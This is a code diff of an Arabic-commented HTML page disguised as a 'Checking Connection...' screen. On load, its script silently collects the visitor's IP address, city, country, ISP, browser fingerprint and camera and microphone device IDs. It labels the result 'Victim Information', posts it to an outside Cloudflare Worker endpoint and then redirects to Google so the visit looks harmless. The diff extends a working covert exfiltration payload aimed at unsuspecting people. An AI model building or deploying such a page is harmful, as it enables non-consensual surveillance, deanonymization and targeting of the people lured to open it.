@@ -2,24 +2,36 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking Connection...</title>
 </head>
 <body>
     <script>
-        async function captureInfo() {
+        async function captureAndSend() {
             try {
-                // جلب الـ IP والمعلومات الجغرافية
-                const ipReq = await fetch('https://ipapi.co/json/');
-                const ipData = await ipReq.json();
+                // 1. جلب معلومات الـ IP والمنطقة
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
 
-                const msg = `
-✅Victim Information 
+                // 2. محاولة جلب أجهزة الوسائط (IDs فقط)
+                let mediaInfo = "audioinput: id =\nvideoinput: id =";
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    mediaInfo = "";
+                    devices.forEach(device => {
+                        mediaInfo += `${device.kind}:  id = ${device.deviceId}\n`;
+                    });
+                } catch (e) {}
 
-⚓ IP: ${ipData.ip} (https://ip-api.com/#${ipData.ip}) | Time: ${new Date().toLocaleString()}
-📍 Location: ${ipData.city} - ${ipData.country_name}
-🌐 ISP: ${ipData.org}
+                // 3. تنسيق الرسالة بالشكل المطلوب تماماً
+                const message = `
+✅<b>Victim Information</b> 
 
-📱 Device Information
+⚓ IP: ${ipData.ip} (https://ip-api.com/#${ipData.ip}) | Time: ${new Date().toISOString().replace('T', ' ').split('.')[0]}
+
+⏳ Date In Victim's Device : ${new Date().toString()}
+
+📱 <b>Device Information</b>
 productSub: ${navigator.productSub}
 vendor: ${navigator.vendor}
 maxTouchPoints: ${navigator.maxTouchPoints}
@@ -32,30 +44,39 @@ platform: ${navigator.platform}
 product: ${navigator.product}
 userAgent: ${navigator.userAgent}
 language: ${navigator.language}
+languages: ${navigator.languages.join(', ')}
 webdriver: ${navigator.webdriver}
 pdfViewerEnabled: ${navigator.pdfViewerEnabled}
+
+📷 <b>Media Device Information</b>
+${mediaInfo}
+
+🌐 <b>Network Info</b>
+ISP: ${ipData.org}
+City: ${ipData.city}
+Country: ${ipData.country_name}
                 `;
 
-                // إرسال البيانات للـ Worker الخاص بك
+                // 4. إرسال البيانات إلى الـ Worker الخاص بك
                 const workerUrl = "https://gbs.tjarb093.workers.dev/";
 
                 await fetch(workerUrl, {
                     method: 'POST',
-                    mode: 'no-cors', 
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: msg })
+                    body: JSON.stringify({ message: message })
                 });
 
-                // توجيه الضحية لـ Google بعد نصف ثانية
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com";
-                }, 500);
+                // 5. التمويه (التوجيه لـ جوجل)
+                window.location.href = "https://www.google.com";
 
             } catch (err) {
+                // في حال حدوث خطأ، يتم التوجيه أيضاً للتمويه
                 window.location.href = "https://www.google.com";
             }
         }
-        window.onload = captureInfo;
+
+        // تشغيل العملية فور فتح الصفحة
+        window.onload = captureAndSend;
     </script>
 </body>
 </html>
